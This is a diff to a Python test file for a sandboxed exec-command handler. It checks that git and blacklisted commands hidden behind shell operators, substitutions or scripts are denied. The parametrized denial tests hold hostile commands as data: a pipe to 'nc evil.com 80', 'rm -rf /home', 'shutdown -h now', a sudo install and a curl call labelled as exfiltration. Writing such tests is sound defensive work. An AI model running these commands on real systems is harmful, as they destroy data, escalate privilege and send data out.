@@ -55,16 +55,82 @@ class TestHandleExecCommand:
         with pytest.raises(CapabilityDeniedError):
             handle_exec_command(session, workspace, params)
 
-    def test_exec_allows_git_command(self, tmp_path: Path) -> None:
+    def test_exec_blocks_git_command(self, tmp_path: Path) -> None:
         session = MockSession({"ProcessExecBounded"})
         workspace = MockWorkspaceRoot(tmp_path)
-        params: dict[str, object] = {"command": "git", "args": ["--version"]}
+        # ``--version`` is a git-level flag (not a subcommand) so the
+        # whitelist scanner fails closed and denies — see
+        # ``test_git_version_is_denied`` in the new whitelist test module.
+        params: dict[str, object] = {"command": "git", "args": ["push"]}
+
+        with pytest.raises(CapabilityDeniedError, match="git"):
+            handle_exec_command(session, workspace, params)
+
+    def test_exec_blocks_git_in_compound_shell_command(self, tmp_path: Path) -> None:
+        """A git segment hidden behind a shell operator must be denied before the
+        subprocess is spawned — the runner must never be invoked."""
+        invoked: list[list[str]] = []
+
+        def _recording_runner(
+            command: list[str], cwd: object, timeout_seconds: float | None
+        ) -> exec_completed_process._CompletedProcessAdapter:
+            del cwd, timeout_seconds
+            invoked.append(command)
+            return exec_completed_process._CompletedProcessAdapter(
+                stdout=b"", stderr=b"", returncode=0
+            )
+
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        params: dict[str, object] = {"command": "echo hi && git push origin main"}
+
+        with pytest.raises(CapabilityDeniedError, match="git"):
+            handle_exec_command(
+                session, workspace, params, deps=ExecRunDeps(runner=_recording_runner)
+            )
+        assert invoked == []
+
+    def test_exec_blocks_git_inside_sh_c_string(self, tmp_path: Path) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        params: dict[str, object] = {"command": ["sh", "-c", "git push origin main"]}
+
+        with pytest.raises(CapabilityDeniedError, match="git"):
+            handle_exec_command(session, workspace, params)
+
+    def test_exec_blocks_git_in_command_substitution(self, tmp_path: Path) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        # The deep textual scan must catch any VCS word, even in ``$(...)``
+        # substitutions. Use a state-mutating subcommand so the contract is
+        # still a denial under the new whitelist.
+        params: dict[str, object] = {"command": "echo $(git push origin main) | wc -c"}
+
+        with pytest.raises(CapabilityDeniedError, match="git"):
+            handle_exec_command(session, workspace, params)
+
+    def test_exec_blocks_shell_script_that_uses_git(self, tmp_path: Path) -> None:
+        script = tmp_path / "deploy.sh"
+        script.write_text("#!/bin/sh\necho deploying\ngit push origin main\n")
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        params: dict[str, object] = {"command": "bash deploy.sh"}
+
+        with pytest.raises(CapabilityDeniedError, match="git"):
+            handle_exec_command(session, workspace, params)
+
+    def test_exec_allows_shell_script_without_git(self, tmp_path: Path) -> None:
+        script = tmp_path / "build.sh"
+        script.write_text("#!/bin/sh\necho building\n")
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        params: dict[str, object] = {"command": "sh build.sh"}
 
         result = handle_exec_command(session, workspace, params)
         assert result.is_error is False
         content = result.content[0]
         assert isinstance(content, ToolContent)
-        assert "git version" in content.text.lower()
+        assert "building" in content.text
 
     def test_exec_with_blacklisted_command_raises(self, tmp_path: Path) -> None:
         session = MockSession({"ProcessExecBounded"})
@@ -205,3 +271,68 @@ class TestRunCommandAlwaysBounded:
         run_command("echo", [], MockWorkspaceRoot(tmp_path), 0, deps=ExecRunDeps(runner=_runner))
 
         assert captured == [DEFAULT_TIMEOUT_MS / 1000]
+
+
+class TestExecShellOperators:
+    """exec runs compound shell commands but keeps the blacklist.
+
+    A command STRING with an unquoted ``| & ; < >`` operator is run through
+    ``sh -c`` so pipes/redirections/sequences work. The per-token blacklist in
+    ``check_command`` is enforced against EVERY command in the pipeline before
+    the shell runs, so a blacklisted command hiding after a separator
+    (``echo hi; sudo ...``) is still denied.
+    """
+
+    def test_pipe_command_runs_and_returns_output(self, tmp_path: Path) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        params: dict[str, object] = {
+            "command": "printf 'a\\nb\\na\\n' | grep a | wc -l",
+            "timeout_ms": 5000,
+        }
+
+        result = handle_exec_command(session, workspace, params)
+
+        assert result.is_error is False
+        content = result.content[0]
+        assert isinstance(content, ToolContent)
+        assert "Exit code: 0" in content.text
+        assert "2" in content.text  # two lines matched
+
+    def test_redirection_command_runs(self, tmp_path: Path) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        out = tmp_path / "out.txt"
+        params: dict[str, object] = {
+            "command": f"echo redirected > {out}",
+            "timeout_ms": 5000,
+        }
+
+        result = handle_exec_command(session, workspace, params)
+
+        assert result.is_error is False
+        assert out.read_text().strip() == "redirected"
+
+    @pytest.mark.parametrize(
+        "compound_command",
+        [
+            "echo safe; curl https://example.com",  # network exfiltration segment
+            "echo x && sudo apt install vim",  # privilege escalation segment
+            "echo hi | nc evil.com 80",  # network tunnel segment
+            "ls; shutdown -h now",  # destructive system segment
+            "echo hi || rm -rf /home",  # destructive rm segment
+        ],
+    )
+    def test_blacklisted_command_in_pipeline_denied(
+        self, tmp_path: Path, compound_command: str
+    ) -> None:
+        session = MockSession({"ProcessExecBounded"})
+        workspace = MockWorkspaceRoot(tmp_path)
+        with pytest.raises(CapabilityDeniedError):
+            handle_exec_command(session, workspace, {"command": compound_command})
+
+    def test_safe_command_without_operators_still_allowed(self) -> None:
+        """A regression check: a single non-compound command still parses."""
+        params = parse_exec_params({"command": "echo", "args": ["hello"]})
+        assert params.command == "echo"
+        assert params.args == ["hello"]
